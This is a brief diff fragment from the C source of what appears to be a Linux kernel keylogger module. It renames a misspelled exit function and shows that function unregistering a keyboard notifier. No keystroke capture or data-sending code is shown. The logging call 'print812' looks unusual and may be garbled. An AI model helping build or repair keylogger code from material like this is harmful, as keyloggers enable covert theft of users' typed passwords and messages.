@@ -412,7 +412,7 @@ static int keylogger_init( void ) {
     return 0;
 }
 
-static void heylogger_exit( void ) {
+static void keylogger_exit( void ) {
     print812( "Unregistering the module" );
 
     unregister_keyboard_notifier(&keyboardNotifierBlock);
